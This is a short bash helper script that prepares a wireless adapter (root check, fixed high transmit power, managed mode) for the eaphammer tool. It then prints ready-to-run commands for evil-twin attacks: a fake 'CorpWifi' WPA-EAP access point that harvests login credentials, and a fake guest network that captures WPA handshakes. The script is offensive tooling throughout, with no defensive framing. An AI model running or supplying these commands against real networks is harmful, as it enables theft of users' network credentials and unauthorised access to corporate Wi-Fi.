#!/bin/bash

interface=wlan0
echo "Interface is set to $interface"
sleep 1

if [ `id -u` -eq 0 ]
then
        echo "Running as sudo user :)"
else
        echo "Please run with sudo!"
        exit 1
fi

echo "Configuring wifi adapter"
sudo ip link set $interface down
sudo iw $interface set txpower fixed 3000
sudo iw dev $interface set type managed
sudo ip link set $interface up

#OPTION to setup on run 
echo "CONFIGURE eaphammer with (sudo /opt/eaphammer/eaphammer --cert-wizard interactive)"


echo "adjust to needs and run: /opt/eaphammer/eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds"
echo "./eaphammer -i wlan0  -c <channel> --auth wpa-psk --essid "HighSpeedGuestNetwork" --capture-wpa-handshakes yes"
